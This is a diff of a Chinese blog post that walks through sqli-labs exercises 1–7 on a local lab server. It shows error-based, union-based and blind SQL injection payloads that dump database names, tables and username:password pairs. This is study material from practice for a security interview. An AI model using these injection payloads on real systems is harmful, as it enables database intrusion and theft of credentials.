@@ -172,10 +172,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2021-06-19 16:38:50 / 修改时间：21:01:12" itemprop="dateCreated datePublished" datetime="2021-06-19T16:38:50+08:00">2021-06-19</time>
+              <time title="创建时间：2021-06-19 16:38:50" itemprop="dateCreated datePublished" datetime="2021-06-19T16:38:50+08:00">2021-06-19</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2021-06-20 20:46:49" itemprop="dateModified" datetime="2021-06-20T20:46:49+08:00">2021-06-20</time>
+              </span>
 
           <br>
             <span class="post-meta-item" title="本文字数">
@@ -183,14 +189,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>1.6k</span>
+              <span>2.9k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>1 分钟</span>
+              <span>3 分钟</span>
             </span>
 
         </div>
@@ -204,48 +210,69 @@
       
           <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本着再多思考思考sql注入的目标，刷一遍sqli-labs。面试时遇到搜索型注入思维顺溜但是表达不顺溜，说明自己还是没有充分理解，无妨，那就来查漏补缺。</p>
 <h1 id="0x01-base"><a href="#0x01-base" class="headerlink" title="0x01 base"></a>0x01 base</h1><h2 id="less-1-字符型"><a href="#less-1-字符型" class="headerlink" title="less-1 字符型"></a>less-1 字符型</h2><p>别忘了<strong>？</strong>后面加参数id=1’</p>
-<p>and ‘1’ = ‘1正常，and ‘1’ = ‘2报错，说明是字符型</p>
+<ol>
+<li><p>and ‘1’ = ‘1正常，and ‘1’ = ‘2报错，说明是字符型</p>
 <p><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/1.png"></p>
 <p>报错回显是limit 0,1，说明后台查询语句很有可能是SELECT * FROM users WHERE id=$id LIMIT 0,1，说明对用户的输入没有处理，直接带入数据库查询。</p>
-<p>字段数</p>
+</li>
+<li><p>字段数</p>
 <p><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/3.png"></p>
-<p>数据库相关信息</p>
+</li>
+<li><p>数据库相关信息</p>
 <p><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/4.png"></p>
 <p><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/5.png"></p>
 <p><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/6.png"></p>
-<p>数据库：</p>
+</li>
+<li><p>数据库：</p>
 <p><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/7.png"></p>
-<p>表：</p>
+</li>
+<li><p>表：</p>
 <p><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/8.png"></p>
-<p>列名：</p>
+</li>
+<li><p>列名：</p>
 <p><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/9.png"></p>
 <p>dump内容：<br><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/10.png"></p>
-<h2 id="less-2-数字型"><a href="#less-2-数字型" class="headerlink" title="less-2 数字型"></a>less-2 数字型</h2><p>数字型判断：</p>
+</li>
+</ol>
+<h2 id="less-2-数字型"><a href="#less-2-数字型" class="headerlink" title="less-2 数字型"></a>less-2 数字型</h2><ol>
+<li><p>数字型判断：</p>
 <p>and 1 =1正常，and 1=2错误(错误并不是报错，而是不返回信息)</p>
 <p><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/15.png"></p>
 <p><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/16.png"></p>
-<p>字段数：</p>
+</li>
+<li><p>字段数：</p>
 <p><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/11.png"></p>
-<p>查当前数据库：</p>
+</li>
+<li><p>查当前数据库：</p>
 <p><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/12.png"></p>
-<p>查所有数据库：</p>
+</li>
+<li><p>查所有数据库：</p>
 <p><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/17.png"></p>
-<p>查所有表：</p>
+</li>
+<li><p>查所有表：</p>
 <p><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/18.png"></p>
-<p>查users表中内容：</p>
+</li>
+<li><p>查users表中内容：</p>
 <p><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/13.png"></p>
 <p>对于用户名和密码看起来不方便，试试这样</p>
 <p><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/14.png"></p>
+</li>
+</ol>
 <h2 id="less-3-单引号-括号"><a href="#less-3-单引号-括号" class="headerlink" title="less-3 单引号+括号"></a>less-3 单引号+括号</h2><p>源码：</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE id=(&#x27;<span class="subst">$id</span>&#x27;) LIMIT 0,1&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=mysql_query(<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$result</span>);</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/23.png"></p>
 <p>报错信息**”1”) LIMIT 0,1‘<strong>表明开发者可能使用的SQL查询语句为</strong>SELECT * FROM users WHERE id=(‘$id’) LIMIT 0,1**,可知是**’)**闭合</p>
-<p>字段数：</p>
+<ol>
+<li><p>字段数：</p>
 <p><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/19.png"></p>
-<p>回显位置：</p>
+</li>
+<li><p>回显位置：</p>
 <p><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/20.png"></p>
-<p>猜库 表 列 表内容：</p>
+</li>
+<li><p>猜库 表 列 表内容：</p>
+</li>
+</ol>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">数据库：</span><br><span class="line">http:&#x2F;&#x2F;localhost:81&#x2F;Less-3&#x2F;?id&#x3D;-1&#39; ) union select 1,2,group_concat(schema_name) from information_schema.schemata--+</span><br><span class="line">表名：</span><br><span class="line">http:&#x2F;&#x2F;localhost:81&#x2F;Less-3&#x2F;?id&#x3D;-1&#39; ) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;&#39;security&#39;--+</span><br><span class="line">列名</span><br><span class="line">http:&#x2F;&#x2F;localhost:81&#x2F;Less-3&#x2F;?id&#x3D;-1&#39; ) union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;&#39;users&#39;--+</span><br><span class="line">表内容</span><br><span class="line">http:&#x2F;&#x2F;localhost:81&#x2F;Less-3&#x2F;?id&#x3D;-1&#39; ) union select 1,2,group_concat(username,&#39;:&#39;,password) from users--+</span><br></pre></td></tr></table></figure>
 
 <h2 id="less-4-双引号-括号"><a href="#less-4-双引号-括号" class="headerlink" title="less-4 双引号+括号"></a>less-4 双引号+括号</h2><p><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/24.png"></p>
@@ -253,13 +280,62 @@
 <p><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/21.png"></p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:81&#x2F;Less-4&#x2F;?id&#x3D;1&quot; ) union select 1,2,3--+</span><br><span class="line">...</span><br><span class="line">同上</span><br></pre></td></tr></table></figure>
 
-<h2 id="less-5-盲注-单引号"><a href="#less-5-盲注-单引号" class="headerlink" title="less-5 盲注+单引号"></a>less-5 盲注+单引号</h2><p>如果查询的id在数据库当中，可以发现页面内显示“you are  in…“,如果不在则什么也不显示，判断为盲注</p>
+<h2 id="less-5-单引号-盲注"><a href="#less-5-单引号-盲注" class="headerlink" title="less-5 单引号+盲注"></a>less-5 单引号+盲注</h2><p>如果查询的id在数据库当中，可以发现页面内显示“you are  in…“,如果不在则什么也不显示，判断为盲注</p>
 <p><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/22.png"></p>
 <p><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/25.png"></p>
 <p>可以看到报错信息是**”1” LIMIT 0,1’**，后台代码可能是这样写的： <strong>SELECT * FROM users WHERE id=’$id’ LIMIT 0,1</strong> </p>
+<ol>
+<li><p>探测数据库名称长度：</p>
 <p><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/26.png"></p>
 <p><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/27.png"></p>
-<blockquote>
+</li>
+<li><p>猜测每个字符：and(left(database(),1)=’s’)</p>
+<p><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/28.png"></p>
+<p><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/29.png"></p>
+</li>
+<li><p>猜测security数据库下表的个数count()=1:</p>
+<p>and (select count()=1) </p>
+<p><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/30.png"></p>
+<p><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/31.png"></p>
+</li>
+<li><p>猜每个表名长度substr((),start,length)start为开始位置，length为截取的长度</p>
+<p>猜第一个表的长度：</p>
+<p><a target="_blank" rel="noopener" href="http://localhost:81/Less-5/?id=1&#39;">http://localhost:81/Less-5/?id=1&#39;</a> and ascii(substr((select table_name from information_schema.tables where table_schema=’security’ limit 0,1),7,1 ))–+</p>
+<p><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/32.png"></p>
+<p><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/33.png"></p>
+<p>所以第一个表长度为6</p>
+<p>第二个表 </p>
+<p><a target="_blank" rel="noopener" href="http://localhost:81/Less-5/?id=1&#39;">http://localhost:81/Less-5/?id=1&#39;</a> and ascii(substr((select table_name from information_schema.tables where table_schema=’security’ limit 1,1),1,1 ))–+</p>
+</li>
+<li><p>猜表名</p>
+<p>第一个表名：</p>
+<p><a target="_blank" rel="noopener" href="http://localhost:81/Less-5/?id=1&#39;">http://localhost:81/Less-5/?id=1&#39;</a> and ascii(substr((select table_name from information_schema.tables where table_schema=’security’ limit 0,1),1,1 ))=1–+</p>
+<p><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/34.png"></p>
+<p><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/35.png"></p>
+</li>
+<li><p>表中列个数：</p>
+<p><a target="_blank" rel="noopener" href="http://localhost:81/Less-5/?id=1&#39;">http://localhost:81/Less-5/?id=1&#39;</a> and (select count(column_name) from information_schema.columns where table_name=’users’)=3–+</p>
+<p>为3时，显示you are in,说明有三列</p>
+</li>
+<li><p>列名：</p>
+<p><a target="_blank" rel="noopener" href="http://localhost:81/Less-5/?id=1&#39;">http://localhost:81/Less-5/?id=1&#39;</a> and ascii(substr((select column_name from information_schema.columns where table_name=’users’ limit ,1),1,1 ))=105–+</p>
+<p>猜测第一列名的第一个字母为i</p>
+</li>
+<li><p>每一列中的具体内容，即用户名，密码，id就不用猜了</p>
+<p>先猜长度：</p>
+<p><a target="_blank" rel="noopener" href="http://localhost:81/Less-5/?id=1&#39;">http://localhost:81/Less-5/?id=1&#39;</a> and ascii(substr((select username from users limit 0,1),5,1 ))–+</p>
+<p><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/36.png"></p>
+<p>第一个用户名长度为4，于是可以爆出来所有用户的长度</p>
+</li>
+<li><p>用户名：</p>
+<p><a target="_blank" rel="noopener" href="http://localhost:81/Less-5/?id=1&#39;">http://localhost:81/Less-5/?id=1&#39;</a> and ascii(substr((select username from users limit 0,1),1,1 ))=68–+</p>
+<p>第一个用户名首字母ASCII码为68，说明是D，于是可以爆出所有用户名</p>
+</li>
+</ol>
+<h2 id="less-6-双引号-盲注"><a href="#less-6-双引号-盲注" class="headerlink" title="less 6 双引号+盲注"></a>less 6 双引号+盲注</h2><p><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/37.png"></p>
+<p>因报错信息能猜出后台SQL查询语句为SELECT * FROM users WHERE id=”$id” LIMIT 0,1，错误日志中两个单引号是为了与”区分。</p>
+<p>同上，直接把单引号变为双引号即可</p>
+<h2 id="less-7-dump-into-outfile"><a href="#less-7-dump-into-outfile" class="headerlink" title="less 7 dump into outfile"></a>less 7 dump into outfile</h2><blockquote>
 <p>limit用法：</p>
 <p><img src="/2021/06/19/sqli-labs%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/2.png"></p>
 </blockquote>
